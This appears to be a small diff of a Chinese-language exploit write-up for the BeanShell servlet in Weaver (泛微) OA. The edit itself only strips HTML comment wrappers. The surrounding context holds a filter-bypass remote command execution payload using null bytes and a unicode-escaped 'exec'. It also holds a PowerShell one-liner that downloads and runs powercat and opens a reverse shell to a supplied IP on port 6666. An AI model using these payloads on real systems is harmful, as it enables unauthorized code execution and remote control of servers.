@@ -87,16 +87,14 @@ bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.
 
 -   1.其他形式绕过
 
-```{=html}
 <!-- -->
-```
+
     eval%00("ex"%2b"ec(\"whoami\")"); 也可以换成 ex\u0065c("cmd /c dir");
 
 -   2.泛微多数都是windows环境, 反弹shell可以使用pcat
 
-```{=html}
 <!-- -->
-```
+
     powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd
 
 #### poc
